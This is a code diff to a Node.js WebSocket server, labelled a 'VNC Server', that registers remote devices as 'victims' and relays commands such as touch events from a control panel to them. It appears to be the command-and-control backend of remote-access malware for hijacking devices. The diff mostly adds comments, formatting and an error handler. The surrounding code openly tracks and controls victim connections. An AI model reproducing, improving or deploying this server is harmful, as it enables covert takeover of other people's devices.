@@ -9,15 +9,16 @@ const wss = new WebSocket.Server({ server });
 
 const PORT = process.env.PORT || 8080;
 
+// Victims & Panels
 const victims = new Map();
 const panels = new Set();
 
-app.use(express.static(path.join(__dirname, 'public')));
-
+// Serve panel.html
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'panel.html'));
+    res.sendFile(path.join(__dirname, 'panel.html'));
 });
 
+// WebSocket Connection
 wss.on('connection', (ws, req) => {
     const clientIP = req.socket.remoteAddress;
     console.log(`🔗 New connection from ${clientIP}`);
@@ -28,10 +29,10 @@ wss.on('connection', (ws, req) => {
     ws.on('message', (data) => {
         try {
             const message = data.toString();
-            
+
             if (message.startsWith('REGISTER:')) {
                 const type = message.replace('REGISTER:', '').trim();
-                
+
                 if (type === 'PANEL') {
                     clientType = 'panel';
                     panels.add(ws);
@@ -39,18 +40,18 @@ wss.on('connection', (ws, req) => {
                     ws.send(JSON.stringify({ type: 'info', message: 'Connected as Control Panel' }));
                     const victimList = Array.from(victims.keys());
                     ws.send(JSON.stringify({ type: 'victimList', victims: victimList }));
-                    
+
                 } else if (type.startsWith('VICTIM:')) {
                     clientType = 'victim';
                     victimId = type.replace('VICTIM:', '').trim() || `device_${Date.now()}`;
                     victims.set(victimId, ws);
                     console.log(`📱 Victim connected: ${victimId}`);
                     ws.send(JSON.stringify({ type: 'info', message: 'Connected as Victim' }));
-                    
+
                     panels.forEach(panel => {
-                        panel.send(JSON.stringify({ 
-                            type: 'victimConnected', 
-                            victimId: victimId 
+                        panel.send(JSON.stringify({
+                            type: 'victimConnected',
+                            victimId: victimId
                         }));
                     });
                 }
@@ -67,7 +68,7 @@ wss.on('connection', (ws, req) => {
             }
 
             const command = JSON.parse(message);
-            
+
             if (command.type === 'touch' && command.victimId) {
                 const victimWs = victims.get(command.victimId);
                 if (victimWs && victimWs.readyState === WebSocket.OPEN) {
@@ -97,23 +98,28 @@ wss.on('connection', (ws, req) => {
 
     ws.on('close', () => {
         console.log(`🔌 Connection closed: ${clientIP} (${clientType})`);
-        
+
         if (clientType === 'victim' && victimId) {
             victims.delete(victimId);
             panels.forEach(panel => {
-                panel.send(JSON.stringify({ 
-                    type: 'victimDisconnected', 
-                    victimId: victimId 
+                panel.send(JSON.stringify({
+                    type: 'victimDisconnected',
+                    victimId: victimId
                 }));
             });
         }
-        
+
         if (clientType === 'panel') {
             panels.delete(ws);
         }
     });
+
+    ws.on('error', (err) => {
+        console.error('WebSocket error:', err);
+    });
 });
 
+// Health Check
 app.get('/health', (req, res) => {
     res.json({
         status: 'online',
@@ -124,4 +130,5 @@ app.get('/health', (req, res) => {
 
 server.listen(PORT, () => {
     console.log(`🔥 VNC Server running on port ${PORT}`);
+    console.log(`📱 Panel: http://localhost:${PORT}`);
 });
